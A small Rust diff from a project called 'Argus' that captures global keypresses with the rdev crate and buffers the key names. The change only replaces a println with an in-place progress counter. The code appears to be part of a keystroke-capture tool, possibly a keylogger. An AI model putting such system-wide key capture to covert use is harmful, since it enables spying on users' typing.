@@ -2,9 +2,9 @@ use crate::method::Method;
 
 use rdev::{listen, Event, EventType::KeyPress, Key::Backspace};
 
+use std::io::{self, Write};
 use std::sync::Arc;
 use std::sync::RwLock;
-
 use std::thread;
 
 pub struct Argus {
@@ -42,7 +42,11 @@ impl Argus {
             if let Some(name) = event.name {
                 //let mut buffer: Vec<String> = buffer.to_vec();
                 let buffer_cap: usize = { *buffer_cap.read().unwrap() };
-                println!("{} / {}", buffer.len(), buffer_cap);
+                {
+                    let mut stdout = io::stdout();
+                    write!(stdout, "\r{} / {}    ", buffer.len(), buffer_cap);
+                    let _ = stdout.flush();
+                }
                 if buffer.len() == buffer_cap {
                     buffer.push(name);
                     // spawns a daemon thread to avoid lag when handling the buffer
